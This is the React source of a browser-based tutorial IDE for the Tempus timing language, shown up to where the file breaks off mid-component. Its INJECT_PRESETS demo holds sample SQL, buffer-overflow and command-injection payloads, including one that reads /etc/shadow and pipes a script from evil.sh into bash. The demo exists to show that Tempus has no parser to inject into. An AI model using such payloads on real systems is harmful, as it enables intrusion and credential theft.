import React, { useState, useRef, useCallback, useMemo, useEffect } from "react";
import Link from "next/link";
import Head from "next/head";
import {
  Files, Search, GitBranch, Play, Blocks, Settings, ChevronRight, ChevronDown,
  X, Circle, FileCode2, FileText, Folder, FolderOpen,
  AlertCircle, Bell, PanelBottomClose, Check, ShieldX,
  BookOpen, Activity, ListTree, Cpu, Terminal as TerminalIcon,
} from "lucide-react";

import { compile, type CompileResult } from "../lib/tempus/compile";
import { createSimulator } from "../lib/tempus/runtime";
import { LESSONS, EXAMPLES, type Lesson } from "../lib/tempus/lessons";
import type { Diag, SimEvent } from "../lib/tempus/types";
import { CanvasScatter, CanvasHistogram, CanvasStrip } from "../components/charts";
import type { ScatterPoint, ScatterBand, HistBand, StripEntry } from "../components/charts";

/* ------------------------------------------------------------------ *
 *  THEME — tinted to the site's dark-teal palette.                    *
 * ------------------------------------------------------------------ */
const theme = {
  titlebar: "#11201c", activitybar: "#0c1714", activitybarFg: "#5d736d",
  activitybarFgActive: "#d7faf5", sidebar: "#0d1714", sidebarFg: "#b3c6c1",
  sidebarHeader: "#6f8a84", editor: "#070d0b", editorFg: "#d4e6e2",
  tabBar: "#0d1714", tabActive: "#070d0b", tabInactive: "#101c18",
  tabFg: "#7a948e", tabFgActive: "#eafaf8", border: "#1a2924",
  accent: "#0e6b62", accentBright: "#58E6D9", statusBar: "#0b2e2a",
  statusFg: "#a9ece5", panel: "#070d0b", gutter: "#46615b",
  lineActive: "#11201c", selection: "#15392f",
};

/* ------------------------------------------------------------------ *
 *  FILE SYSTEM — generated from the lesson curriculum.                *
 * ------------------------------------------------------------------ */
interface FileNode { type: "file"; lang: string; content: string }
interface FolderNode { type: "folder"; children: Record<string, FNode> }
type FNode = FileNode | FolderNode;

const LESSON_FILES = LESSONS.map((l, i) => ({
  lesson: l,
  index: i,
  name: `${String(i + 1).padStart(2, "0")}_${l.id.replace(/-/g, "_")}.tempus`,
}));
const EXAMPLE_FILES = EXAMPLES.map((l) => ({
  lesson: l,
  name: `${l.id.replace(/-/g, "_")}.tempus`,
}));
const ALL_FILES = [...LESSON_FILES, ...EXAMPLE_FILES];

const README = `# Tempus — Interactive Tutorial

A self-contained, browser-only sandbox for the Tempus temporal-programming
language. The production compiler is implemented in Rust; this is a teaching
model written entirely in TypeScript.

## How to use
- Open a lesson under  lessons/  in the Explorer.
- Read the lesson notes in the LESSON tab on the right.
- Press COMPILE to run the static checks (the cell registry Γ is frozen
  only if there are no errors).
- Press RUN to simulate a stream of pulses and watch them classified.

## The idea
The only datum in Tempus is the timing deviation
    ΔP(k) = T_ref(k) − t_rec(k)
of the k-th pulse from the reference oscillator's tick. A program is a set
of cells over ΔP-space, each mapping to a pre-compiled action. There is no
content parser — and therefore no injection surface.

Work through the lessons in order; each builds on the last. Then open
examples/ to see the other instruments — thin-film, polymorphism, bioreactor,
synthesis QC, and PSDR — each re-expressed as a runnable Tempus partition.`;

const initialFiles: Record<string, FNode> = {
  lessons: {
    type: "folder",
    children: Object.fromEntries(
      LESSON_FILES.map(f => [f.name, { type: "file", lang: "tempus", content: f.lesson.script } as FileNode]),
    ),
  },
  examples: {
    type: "folder",
    children: Object.fromEntries(
      EXAMPLE_FILES.map(f => [f.name, { type: "file", lang: "tempus", content: f.lesson.script } as FileNode]),
    ),
  },
  "README.md": { type: "file", lang: "md", content: README },
};

const lessonForName = (name: string): Lesson | null =>
  ALL_FILES.find(f => f.name === name)?.lesson ?? null;

/* ------------------------------------------------------------------ *
 *  Helpers                                                            *
 * ------------------------------------------------------------------ */
const PALETTE = ["#58E6D9", "#f59e0b", "#f97316", "#ef4444", "#60a5fa", "#a78bfa", "#34d399", "#fb923c"];
const ANOMALY = "#4b5563";

function paletteFor(names: string[]): Map<string, string> {
  const m = new Map<string, string>();
  names.forEach((n, i) => m.set(n, PALETTE[i % PALETTE.length]));
  m.set("anomaly", ANOMALY);
  return m;
}

function fmtDP(v: number): string {
  const a = Math.abs(v);
  if (a === 0) return "0";
  if (a < 1e-6) return `${(v * 1e9).toFixed(1)} ns`;
  if (a < 1e-3) return `${(v * 1e6).toFixed(2)} µs`;
  return `${(v * 1e3).toFixed(2)} ms`;
}

function posToLineCol(src: string, pos?: number): { line: number; col: number } | null {
  if (pos == null) return null;
  let line = 1, col = 1;
  for (let i = 0; i < pos && i < src.length; i++) {
    if (src[i] === "\n") { line++; col = 1; } else col++;
  }
  return { line, col };
}

const SEV = {
  error:   { color: "#ef4444", glyph: "✕" },
  warning: { color: "#f59e0b", glyph: "⚠" },
  info:    { color: "#58E6D9", glyph: "ℹ" },
} as const;

const fileIcon = (name: string): { Icon: any; color: string } => {
  if (name.endsWith(".tempus")) return { Icon: FileCode2, color: "#58E6D9" };
  if (name.endsWith(".md")) return { Icon: FileText, color: "#7aa2a0" };
  return { Icon: FileText, color: "#858585" };
};
const langLabel = (lang: string) => (({ tempus: "Tempus", md: "Markdown" } as Record<string, string>)[lang] || "Plain Text");
const getNode = (tree: Record<string, FNode>, path: string[]): any => {
  let n: any = { children: tree };
  for (const p of path) { n = n.children?.[p]; if (!n) return null; }
  return n;
};
const cloneTree = (o: Record<string, FNode>): Record<string, FNode> => JSON.parse(JSON.stringify(o));

/* ------------------------------------------------------------------ *
 *  File tree (recursive)                                              *
 * ------------------------------------------------------------------ */
function Tree({ tree, path = [], depth = 0, expanded, toggle, activePath, openFile }: any) {
  const entries = Object.entries(tree).sort((a: any, b: any) =>
    a[1].type !== b[1].type ? (a[1].type === "folder" ? -1 : 1) : a[0].localeCompare(b[0]));
  return (
    <>
      {entries.map(([name, node]: any) => {
        const fullPath = [...path, name];
        const key = fullPath.join("/");
        const isFolder = node.type === "folder";
        const isOpen = expanded.has(key);
        const isActive = activePath === key;
        const { Icon, color } = isFolder
          ? { Icon: isOpen ? FolderOpen : Folder, color: "#5d9e95" }
          : fileIcon(name);
        return (
          <div key={key}>
            <button
              onClick={() => (isFolder ? toggle(key) : openFile(fullPath))}
              className="flex w-full items-center gap-1 py-0.5 pr-2 text-left text-[13px] leading-relaxed transition-colors"
              style={{ paddingLeft: 8 + depth * 12, color: theme.sidebarFg, background: isActive ? theme.lineActive : "transparent" }}
              onMouseEnter={(e) => { if (!isActive) (e.currentTarget as HTMLElement).style.background = theme.lineActive; }}
              onMouseLeave={(e) => { if (!isActive) (e.currentTarget as HTMLElement).style.background = "transparent"; }}>
              {isFolder ? (isOpen ? <ChevronDown size={14} className="shrink-0 opacity-70" /> : <ChevronRight size={14} className="shrink-0 opacity-70" />) : <span className="w-[14px] shrink-0" />}
              <Icon size={15} className="shrink-0" style={{ color }} />
              <span className="truncate">{name}</span>
            </button>
            {isFolder && isOpen && (
              <Tree tree={node.children} path={fullPath} depth={depth + 1} expanded={expanded} toggle={toggle} activePath={activePath} openFile={openFile} />
            )}
          </div>
        );
      })}
    </>
  );
}

/* ------------------------------------------------------------------ *
 *  Editor (line-numbered, editable)                                   *
 * ------------------------------------------------------------------ */
function Editor({ value, onChange, onCursor, readOnly }: any) {
  const gutterRef = useRef<HTMLDivElement>(null);
  const lines = value.split("\n");
  const syncScroll = (e: any) => { if (gutterRef.current) gutterRef.current.scrollTop = e.target.scrollTop; };
  const handleCursor = (e: any) => {
    const upto = e.target.value.slice(0, e.target.selectionStart);
    onCursor({ ln: upto.split("\n").length, col: upto.length - upto.lastIndexOf("\n") });
  };
  return (
    <div className="flex min-h-0 flex-1" style={{ background: theme.editor }}>
      <div ref={gutterRef} className="select-none overflow-hidden py-3 text-right font-mono text-[13px] leading-[1.5]" style={{ color: theme.gutter, minWidth: 52, paddingRight: 16 }}>
        {lines.map((_: any, i: number) => <div key={i}>{i + 1}</div>)}
      </div>
      <textarea
        value={value} onChange={(e) => onChange(e.target.value)} onScroll={syncScroll}
        onKeyUp={handleCursor} onClick={handleCursor} spellCheck={false} readOnly={readOnly}
        className="min-h-0 flex-1 resize-none border-0 bg-transparent py-3 pr-4 font-mono text-[13px] leading-[1.5] outline-none"
        style={{ color: theme.editorFg, tabSize: 2, caretColor: theme.accentBright }} />
    </div>
  );
}

/* ------------------------------------------------------------------ *
 *  Output views                                                       *
 * ------------------------------------------------------------------ */
const INJECT_PRESETS: Record<string, string> = {
  SQL: `'; DROP TABLE reactor_logs; --`,
  BOF: `AAAAAAAAAAAA\\x90\\x90\\x90\\xeb\\x1f\\x5e\\x89\\x76`,
  CMD: `; cat /etc/shadow || curl evil.sh | bash`,
  JSON: `{"op":"emergency_shutdown","authorized":true}`,
};

function InjectBox({ cellCount }: { cellCount: number }) {
  const [payload, setPayload] = useState(INJECT_PRESETS.SQL);
  const [log, setLog] = useState<{ bytes: number }[]>([]);
  const [stats, setStats] = useState({ injected: 0, bytes: 0 });
  const inject = (t: string) => { setLog(p => [{ bytes: t.length }, ...p].slice(0, 40)); setStats(s => ({ injected: s.injected + 1, bytes: s.bytes + t.length })); };
  return (
    <div className="mt-4" style={{ border: "1px solid rgba(239,68,68,0.25)" }}>
      <div className="flex items-center gap-2 px-3 py-2" style={{ background: "rgba(239,68,68,0.05)", borderBottom: "1px solid rgba(239,68,68,0.15)" }}>
        <ShieldX size={13} style={{ color: "#ef4444" }} />
        <span className="font-mono text-[10px]" style={{ color: "rgba(255,255,255,0.5)" }}>INJECTOR — there is no parser to reach</span>
      </div>
      <div className="p-3">
        <textarea value={payload} onChange={e => setPayload(e.target.value)} spellCheck={false}
          className="w-full resize-y p-2 font-mono text-[11px] leading-[1.5] outline-none"
          style={{ minHeight: 56, background: "#120a0a", color: "#ef4444", border: "1px solid rgba(239,68,68,0.2)", boxSizing: "border-box" }} />
        <div className="mt-1.5 flex flex-wrap items-center gap-1.5">
          {Object.entries(INJECT_PRESETS).map(([k, v]) => (
            <button key={k} onClick={() => setPayload(v)} className="font-mono text-[9px]" style={{ padding: "3px 7px", border: "1px solid rgba(255,255,255,0.1)", color: "rgba(255,255,255,0.32)" }}>{k}</button>
          ))}
          <button onClick={() => inject(payload)} className="ml-auto font-mono text-[10px]" style={{ padding: "4px 12px", background: "rgba(239,68,68,0.1)", color: "#ef4444", border: "1px solid rgba(239,68,68,0.35)", letterSpacing: "0.08em" }}>INJECT</button>
          <button onClick={() => { setLog([]); setStats({ injected: 0, bytes: 0 }); }} className="font-mono text-[10px]" style={{ padding: "4px 10px", color: "rgba(255,255,255,0.2)", border: "1px solid rgba(255,255,255,0.08)" }}>RESET</button>
        </div>
        <div className="mt-2 grid grid-cols-3">
          {[["INJECTED", String(stats.injected), undefined], ["PARSERS", "0", "#34d399"], ["|Cells(Γ)|", String(cellCount), theme.accentBright]].map(([k, v, c]) => (
            <div key={k as string} className="px-1 py-1.5 text-center" style={{ borderRight: "1px solid rgba(255,255,255,0.05)" }}>
              <div className="font-mono" style={{ fontSize: 7, letterSpacing: "0.1em", color: "rgba(255,255,255,0.22)" }}>{k}</div>
              <div className="mt-0.5 font-mono text-[14px] font-bold" style={{ color: (c ?? "rgba(255,255,255,0.55)") as string }}>{v}</div>
            </div>
          ))}
        </div>
        {log.length > 0 && (
          <div className="mt-2 max-h-24 overflow-y-auto">
            {log.map((e, i) => (
              <div key={i} className="grid px-1 py-0.5 font-mono text-[9px]" style={{ gridTemplateColumns: "46px 1fr", gap: 6 }}>
                <span style={{ color: "rgba(239,68,68,0.5)" }}>{e.bytes}B</span>
                <span className="italic" style={{ color: "rgba(255,255,255,0.16)" }}>discarded · no parser to reach</span>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
}

function LessonView({ lesson, readme, cellCount }: { lesson: Lesson | null; readme: string | null; cellCount: number }) {
  if (!lesson) {
    return (
      <div className="h-full overflow-y-auto p-5 font-mono text-[12px] leading-[1.7] whitespace-pre-wrap" style={{ color: "rgba(255,255,255,0.55)" }}>
        {readme}
      </div>
    );
  }
  const isEx = lesson.kind === "example";
  const i = LESSON_FILES.findIndex(f => f.lesson.id === lesson.id);
  return (
    <div className="h-full overflow-y-auto px-6 py-5">
      <div style={{ fontSize: 9, color: theme.accentBright, letterSpacing: "0.22em", fontFamily: "monospace" }}>
        {isEx ? "INSTRUMENT EXAMPLE" : `LESSON ${String(i + 1).padStart(2, "0")}`}
      </div>
      <h1 style={{ fontSize: 21, fontWeight: 700, color: "#eafaf8", margin: "6px 0 3px" }}>{lesson.title}</h1>
      <div style={{ fontSize: 12, color: "rgba(255,255,255,0.42)", fontStyle: "italic", marginBottom: 14 }}>{lesson.tagline}</div>
      {lesson.body.map((p, k) => {
        const isFormula = /^[A-Za-zΔ()]+\s*=/.test(p) || /T\(n,d\)\s*=/.test(p);
        return (
          <p key={k} style={{
            fontSize: isFormula ? 13 : 12.5, lineHeight: 1.7, margin: "0 0 10px",
            color: isFormula ? "#9fe8e0" : "rgba(255,255,255,0.66)",
            fontFamily: isFormula ? "monospace" : "inherit", textAlign: isFormula ? "center" : "left",
          }}>{p}</p>
        );
      })}
      <div style={{ marginTop: 8, borderTop: "1px solid rgba(255,255,255,0.07)", paddingTop: 12 }}>
        {lesson.points.map((pt, k) => (
          <div key={k} style={{ display: "flex", gap: 9, fontSize: 11.5, color: "rgba(255,255,255,0.55)", lineHeight: 1.55, marginBottom: 6 }}>
            <span style={{ color: theme.accentBright }}>▸</span><span>{pt}</span>
          </div>
        ))}
      </div>
      {lesson.feature === "inject" && <InjectBox cellCount={cellCount} />}
    </div>
  );
}

interface SimDerived {
  points: ScatterPoint[]; bands: ScatterBand[]; hist: number[]; histBands: HistBand[];
  strip: StripEntry[]; log: { cell: string; action: string; dp: number; color: string }[];
  stats: { total: number; dispatched: number; anomalies: number };
}

function SimulationView({ derived, showPhase }: { derived: SimDerived | null; showPhase: boolean }) {
  if (!derived || derived.stats.total === 0) {
    return <Placeholder text="press RUN to simulate a pulse stream" />;
  }
  const { points, bands, hist, histBands, strip, log, stats } = derived;
  return (
    <div className="flex h-full flex-col overflow-hidden">
      <div className="grid shrink-0 grid-cols-3" style={{ borderBottom: `1px solid ${theme.border}` }}>
        {[["EVENTS", String(stats.total), undefined],
          ["DISPATCHED", String(stats.dispatched), theme.accentBright],
          ["ANOMALIES", String(stats.anomalies), stats.anomalies > 0 ? "#ef4444" : undefined]].map(([k, v, c]) => (
          <div key={k as string} className="px-1.5 py-2 text-center" style={{ borderRight: `1px solid ${theme.border}` }}>
            <div style={{ fontSize: 7.5, letterSpacing: "0.12em", color: "rgba(255,255,255,0.25)", fontFamily: "monospace" }}>{k}</div>
            <div style={{ fontSize: 14, fontFamily: "monospace", fontWeight: 700, marginTop: 2, color: (c ?? "rgba(255,255,255,0.6)") as string }}>{v}</div>
          </div>
        ))}
      </div>
      <div className="grid min-h-0 flex-1" style={{ gridTemplateRows: showPhase ? "1.3fr 1fr 0.5fr" : "1.3fr 1fr", gap: 1, background: theme.border }}>
        <div style={{ background: theme.editor, overflow: "hidden" }}>
          <CanvasScatter points={points} bands={bands} title="ΔP  TIMELINE" fmt={fmtDP} />
        </div>
        <div style={{ background: theme.editor, overflow: "hidden" }}>
          <CanvasHistogram values={hist} bands={histBands} title="ΔP  HISTOGRAM" fmt={fmtDP} bins={40} />
        </div>
        {showPhase && (
          <div style={{ background: theme.editor, overflow: "hidden" }}>
            <CanvasStrip entries={strip} legend={[{ color: "#60a5fa", label: "COMPILE" }, { color: "#f59e0b", label: "EXECUTE" }]} title="PHASE  TIMELINE" />
          </div>
        )}
      </div>
      <div className="shrink-0 overflow-y-auto" style={{ height: 92, borderTop: `1px solid ${theme.border}` }}>
        <div className="px-3 pb-1 pt-1.5" style={{ fontSize: 8, letterSpacing: "0.16em", color: "rgba(255,255,255,0.22)", fontFamily: "monospace" }}>ACTION LOG</div>
        {log.length === 0
          ? <div className="px-3 py-1 font-mono text-[9px] italic" style={{ color: "rgba(255,255,255,0.18)" }}>no dispatches</div>
          : log.map((e, i) => (
            <div key={i} className="grid px-3 py-0.5 font-mono text-[9px]" style={{ gridTemplateColumns: "1fr 60px", gap: 6 }}>
              <div className="min-w-0 truncate"><span style={{ color: e.color, fontWeight: 600 }}>{e.cell}</span><span style={{ color: "rgba(255,255,255,0.35)", marginLeft: 6 }}>{e.action}</span></div>
              <span className="text-right" style={{ color: "rgba(255,255,255,0.25)", fontSize: 8 }}>{fmtDP(e.dp)}</span>
            </div>
          ))}
      </div>
    </div>
  );
}

function DiagnosticsView({ result, src }: { result: CompileResult | null; src: string }) {
  if (!result) return <Placeholder text="press COMPILE (or edit a .tempus file) to see diagnostics" />;
  const { diagnostics, ok } = result;
  const c = {
    error: diagnostics.filter(d => d.severity === "error").length,
    warning: diagnostics.filter(d => d.severity === "warning").length,
    info: diagnostics.filter(d => d.severity === "info").length,
  };
  return (
    <div className="h-full overflow-y-auto p-3">
      <div className="mb-3 flex items-center gap-2.5 px-3 py-2" style={{ border: `1px solid ${ok ? "rgba(52,211,153,0.4)" : "rgba(239,68,68,0.4)"}`, background: ok ? "rgba(52,211,153,0.06)" : "rgba(239,68,68,0.06)" }}>
        <span style={{ fontSize: 14, color: ok ? "#34d399" : "#ef4444" }}>{ok ? "✓" : "✕"}</span>
        <span className="font-mono text-[11px]" style={{ color: ok ? "#34d399" : "#ef4444", letterSpacing: "0.04em" }}>{ok ? "COMPILED — registry Γ frozen" : "COMPILE FAILED"}</span>
        <span className="ml-auto font-mono text-[9px]" style={{ color: "rgba(255,255,255,0.35)" }}>{c.error}E · {c.warning}W · {c.info}I</span>
      </div>
      {diagnostics.length === 0
        ? <div className="px-1 font-mono text-[10px] italic" style={{ color: "rgba(52,211,153,0.7)" }}>no diagnostics — program is well-formed.</div>
        : diagnostics.map((d: Diag, i) => {
          const s = SEV[d.severity]; const lc = posToLineCol(src, d.pos);
          return (
            <div key={i} className="mb-0.5 grid gap-2 px-2 py-1.5" style={{ gridTemplateColumns: "16px 1fr", borderLeft: `2px solid ${s.color}`, background: "rgba(255,255,255,0.015)" }}>
              <span style={{ color: s.color, fontSize: 11, lineHeight: "15px" }}>{s.glyph}</span>
              <div>
                <div className="font-mono text-[10.5px]" style={{ color: "rgba(255,255,255,0.78)", lineHeight: 1.5 }}>{d.message}</div>
                {lc && <div className="mt-0.5 font-mono text-[8.5px]" style={{ color: "rgba(255,255,255,0.3)" }}>line {lc.line}, col {lc.col}</div>}
              </div>
            </div>
          );
        })}
    </div>
  );
}

function RegistryView({ result }: { result: CompileResult | null }) {
  const reg = result?.registry;
  if (!reg) return <Placeholder text="compiled cell registry appears here" />;
  return (
    <div className="h-full overflow-y-auto p-3">
      <SectionLabel>COMPILED REGISTRY Γ</SectionLabel>
      <div className="mb-2 grid grid-cols-2 gap-1.5">
        <Stat k="channels (d)" v={String(reg.channels.length)} />
        <Stat k="cells" v={String(reg.cells.length)} />
        <Stat k="span lo" v={reg.span ? fmtDP(reg.span[0]) : "—"} />
        <Stat k="span hi" v={reg.span ? fmtDP(reg.span[1]) : "—"} />
      </div>
      <div className="mb-2.5 font-mono text-[9px]" style={{ color: "rgba(255,255,255,0.4)" }}>
        {reg.channels.map((c, i) => <span key={c} style={{ color: PALETTE[i % PALETTE.length], marginRight: 8 }}>◈ {c}</span>)}
      </div>
      {/* cells */}
      <SectionLabel>CELLS</SectionLabel>
      <div className="mb-3">
        {reg.cells.map((cell, i) => (
          <div key={cell.name} className="mb-0.5 flex items-center justify-between px-2 py-1 font-mono text-[10px]" style={{ border: "1px solid rgba(255,255,255,0.05)" }}>
            <span style={{ color: PALETTE[i % PALETTE.length] }}>{cell.name}</span>
            <span style={{ color: "rgba(255,255,255,0.4)" }}>[{fmtDP(cell.lo)}, {fmtDP(cell.hi)}] → {cell.action}</span>
          </div>
        ))}
      </div>
      {reg.inflation && (
        <>
          <SectionLabel>COMPOSITION INFLATION  T(n,d) = d·(1+d)^(n−1)</SectionLabel>
          <div style={{ border: "1px solid rgba(255,255,255,0.06)" }}>
            <div className="grid px-2.5 py-1 font-mono text-[9px]" style={{ gridTemplateColumns: "40px 1fr", color: "rgba(255,255,255,0.3)", borderBottom: "1px solid rgba(255,255,255,0.05)" }}>
              <span>n</span><span className="text-right">T(n, d={reg.inflation.d})</span>
            </div>
            {reg.inflation.rows.map(r => (
              <div key={r.n} className="grid px-2.5 py-0.5 font-mono text-[10px]" style={{ gridTemplateColumns: "40px 1fr", borderBottom: "1px solid rgba(255,255,255,0.025)" }}>
                <span style={{ color: "rgba(255,255,255,0.5)" }}>{r.n}</span>
                <span className="text-right" style={{ color: theme.accentBright }}>{r.T.toLocaleString()}</span>
              </div>
            ))}
          </div>
        </>
      )}
    </div>
  );
}

interface RunMeta { name: string; events: number; noise: number; seed: number; freq: number }

function OutputLogView({ events, result, runMeta }: { events: SimEvent[]; result: CompileResult | null; runMeta: RunMeta | null }) {
  if (!runMeta || events.length === 0) return <Placeholder text="press RUN to produce the output log + values" />;
  const reg = result?.registry;
  const cells = result?.runtime ? Array.from(result.runtime.cells.values()) : [];
  const actionOf = (name: string) => result?.runtime?.cells.get(name)?.action;
  const counts = new Map<string, number>();
  events.forEach(e => counts.set(e.cell, (counts.get(e.cell) ?? 0) + 1));
  const dispatched = events.filter(e => e.actionFired !== null).length;
  const anomalies = events.filter(e => e.cell === "anomaly").length;
  const mean = events.reduce((a, e) => a + e.dp, 0) / events.length;
  const CAP = 800;
  const rows = events.slice(0, CAP);
  const COLS = "44px 84px 86px 1fr 64px 74px 80px 40px";
  const dim = "rgba(255,255,255,0.32)";
  return (
    <div className="h-full overflow-y-auto p-3 font-mono text-[11px]" style={{ color: "rgba(255,255,255,0.72)" }}>
      <div style={{ color: "#9cdcfe" }}>$ tempus run {runMeta.name}</div>
      <div style={{ color: dim }}>registry  {reg?.cells.length ?? 0} cells · d={reg?.channels.length ?? 0} · span [{reg?.span ? fmtDP(reg.span[0]) : "—"}, {reg?.span ? fmtDP(reg.span[1]) : "—"}]</div>
      <div style={{ color: dim }}>params    events={runMeta.events} · noise σ={runMeta.noise} · seed={runMeta.seed} · f_ref={runMeta.freq.toExponential(2)} Hz</div>
      <div className="my-2" style={{ borderTop: "1px solid rgba(255,255,255,0.08)" }} />
      <div className="grid" style={{ gridTemplateColumns: COLS, color: dim, paddingBottom: 3 }}>
        <span>k</span><span>channel</span><span>ΔP</span><span>cell</span><span>M</span><span>phase</span><span>t(s)</span><span>act</span>
      </div>
      {rows.map((e, i) => (
        <div key={i} className="grid" style={{ gridTemplateColumns: COLS, padding: "1px 0" }}>
          <span style={{ color: dim }}>{e.index}</span>
          <span style={{ color: "rgba(255,255,255,0.5)" }} className="truncate">{e.channel}</span>
          <span style={{ color: e.dp >= 0 ? "#7fd1c8" : "#f0b072" }}>{fmtDP(e.dp)}</span>
          <span style={{ color: e.cell === "anomaly" ? "#ef4444" : "#9fe8e0" }} className="truncate">{e.cell}</span>
          <span style={{ color: "rgba(255,255,255,0.4)" }}>{e.M}</span>
          <span style={{ color: e.phase === "EXECUTE" ? "#f59e0b" : "#60a5fa" }}>{e.phase}</span>
          <span style={{ color: dim }}>{e.time.toExponential(2)}</span>
          <span style={{ color: e.actionFired ? "#34d399" : "rgba(255,255,255,0.18)" }}>{actionOf(e.cell) ?? "—"}</span>
        </div>
      ))}
      {events.length > CAP && <div style={{ color: dim }}>… {events.length - CAP} more rows</div>}

      <div className="mb-1 mt-3" style={{ borderTop: "1px solid rgba(255,255,255,0.08)", paddingTop: 6, color: dim }}>─ summary ─────────────</div>
      {[["events", String(events.length)], ["dispatched", String(dispatched)], ["anomalies", String(anomalies)], ["mean ΔP", fmtDP(mean)]].map(([k, v]) => (
        <div key={k} className="grid" style={{ gridTemplateColumns: "120px 1fr" }}>
          <span style={{ color: dim }}>{k}</span>
          <span style={{ color: k === "anomalies" && anomalies > 0 ? "#ef4444" : "rgba(255,255,255,0.72)" }}>{v}</span>
        </div>
      ))}
      <div className="mt-1" style={{ color: dim }}>per-cell:</div>
      {[...cells.map(c => c.name), "anomaly"].map(name => {
        const n = counts.get(name) ?? 0;
        if (n === 0 && name === "anomaly") return null;
        const pct = ((100 * n) / events.length).toFixed(1);
        const col = name === "anomaly" ? ANOMALY : (paletteFor(cells.map(c => c.name)).get(name) ?? "#888");
        return (
          <div key={name} className="grid" style={{ gridTemplateColumns: "16px 120px 56px 1fr" }}>
            <span />
            <span style={{ color: col }}>{name}</span>
            <span style={{ color: "rgba(255,255,255,0.6)", textAlign: "right" }}>{n}</span>
            <span style={{ color: dim, paddingLeft: 8 }}>({pct}%)</span>
          </div>
        );
      })}
    </div>
  );
}

function Placeholder({ text }: { text: string }) {
  return <div className="flex h-full items-center justify-center font-mono text-[10px] italic" style={{ color: "rgba(255,255,255,0.16)" }}>{text}</div>;
}
function SectionLabel({ children }: { children: React.ReactNode }) {
  return <div className="mb-1.5 mt-1 font-mono text-[8px]" style={{ letterSpacing: "0.16em", color: "rgba(255,255,255,0.25)" }}>{children}</div>;
}
function Stat({ k, v }: { k: string; v: string }) {
  return (
    <div className="px-2 py-1.5" style={{ border: "1px solid rgba(255,255,255,0.05)" }}>
      <div className="font-mono uppercase" style={{ fontSize: 7.5, letterSpacing: "0.1em", color: "rgba(255,255,255,0.28)" }}>{k}</div>
      <div className="mt-0.5 font-mono text-[12px]" style={{ color: "rgba(255,255,255,0.7)" }}>{v}</div>
    </div>
  );
}

/* ------------------------------------------------------------------ *
 *  Output column                                                      *
 * ------------------------------------------------------------------ */
type OutTab = "lesson" | "output" | "simulation" | "diagnostics" | "registry";

function OutputColumn({ tab, setTab, lesson, readme, events, runMeta, derived, showPhase, result, src, diagCount, cellCount, onCompile, onRun, running }: any) {
  const tabs: { id: OutTab; label: string; Icon: any }[] = [
    { id: "lesson", label: "Lesson", Icon: BookOpen },
    { id: "output", label: "Output", Icon: TerminalIcon },
    { id: "simulation", label: "Charts", Icon: Activity },
    { id: "diagnostics", label: "Diagnostics", Icon: ListTree },
    { id: "registry", label: "Registry", Icon: Cpu },
  ];
  return (
    <div className="flex min-w-0 flex-1 flex-col" style={{ background: theme.editor, borderLeft: `1px solid ${theme.border}` }}>
      <div className="flex h-9 shrink-0 items-center justify-between pr-2" style={{ background: theme.tabInactive }}>
        <div className="flex h-full">
          {tabs.map(({ id, label, Icon }) => {
            const active = tab === id;
            return (
              <button key={id} onClick={() => setTab(id)} className="relative flex items-center gap-1.5 px-3 text-[12px] transition-colors"
                style={{ color: active ? theme.tabFgActive : theme.tabFg, background: active ? theme.tabActive : "transparent" }}>
                <Icon size={13} /> {label}
                {id === "diagnostics" && diagCount > 0 && <span className="rounded-full px-1.5 text-[10px]" style={{ background: theme.accent, color: "#fff" }}>{diagCount}</span>}
                {active && <span className="absolute left-0 top-0 h-0.5 w-full" style={{ background: theme.accentBright }} />}
              </button>
            );
          })}
        </div>
        <div className="flex items-center gap-1.5">
          <button onClick={onCompile} title="Compile" className="flex h-6 items-center gap-1 rounded px-2.5 text-[11px]" style={{ border: `1px solid ${theme.accentBright}55`, color: theme.accentBright }}>
            <Check size={12} /> COMPILE
          </button>
          <button onClick={onRun} disabled={running} title="Run simulation" className="flex h-6 items-center gap-1 rounded px-2.5 text-[11px] font-bold"
            style={{ background: running ? "#1a2a26" : theme.accentBright, color: running ? "#557" : "#03100e" }}>
            <Play size={12} /> {running ? "RUNNING" : "RUN"}
          </button>
        </div>
      </div>
      <div className="min-h-0 flex-1">
        {tab === "lesson" && <LessonView lesson={lesson} readme={readme} cellCount={cellCount} />}
        {tab === "output" && <OutputLogView events={events} result={result} runMeta={runMeta} />}
        {tab === "simulation" && <SimulationView derived={derived} showPhase={showPhase} />}
        {tab === "diagnostics" && <DiagnosticsView result={result} src={src} />}
        {tab === "registry" && <RegistryView result={result} />}
      </div>
    </div>
  );
}

/* ------------------------------------------------------------------ *
 *  Main shell                                                         *
 * ------------------------------------------------------------------ */
function TempusTutorial() {
  const firstKey = `lessons/${LESSON_FILES[0].name}`;
  const [files, setFiles] = useState<Record<string, FNode>>(initialFiles);
  const [expanded, setExpanded] = useState<Set<string>>(new Set(["lessons", "examples"]));
  const [openTabs, setOpenTabs] = useState<string[][]>([["lessons", LESSON_FILES[0].name]]);
  const [activeTab, setActiveTab] = useState<string | null>(firstKey);
  const [dirty, setDirty] = useState<Set<string>>(new Set());
  const [sidebar, setSidebar] = useState(true);
  const [panel, setPanel] = useState(true);
  const [activity, setActivity] = useState("files");
  const [panelTab, setPanelTab] = useState<"problems" | "terminal">("problems");
  const [cursor, setCursor] = useState({ ln: 1, col: 1 });

  const [result, setResult] = useState<CompileResult | null>(null);
  const [events, setEvents] = useState<SimEvent[]>([]);
  const [running, setRunning] = useState(false);
  const [outTab, setOutTab] = useState<OutTab>("lesson");
  const [runMeta, setRunMeta] = useState<RunMeta | null>(null);
  const [termLog, setTermLog] = useState<string[]>(["tempus tutorial — ready."]);

  const [editorWidth, setEditorWidth] = useState(52);
  const splitRef = useRef<HTMLDivElement>(null);
  const dragging = useRef(false);
  const simRef = useRef<ReturnType<typeof createSimulator> | null>(null);
  const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const activePathArr = useMemo(() => openTabs.find((t) => t.join("/") === activeTab) || null, [openTabs, activeTab]);
  const activeNode = activePathArr ? getNode(files, activePathArr) : null;
  const activeName = activePathArr ? activePathArr[activePathArr.length - 1] : "";
  const activeLang = activeNode?.lang ?? "";
  const activeLesson = activeName ? lessonForName(activeName) : null;
  const source: string = activeNode?.content ?? "";

  const stopLoop = useCallback(() => {
    if (intervalRef.current) { clearInterval(intervalRef.current); intervalRef.current = null; }
    setRunning(false);
  }, []);
  useEffect(() => () => stopLoop(), [stopLoop]);

  // ── live compile (debounced) for the active .tempus file ──────────────────
  useEffect(() => {
    if (activeLang !== "tempus") { setResult(null); return; }
    const t = setTimeout(() => setResult(compile(source)), 250);
    return () => clearTimeout(t);
  }, [source, activeLang]);

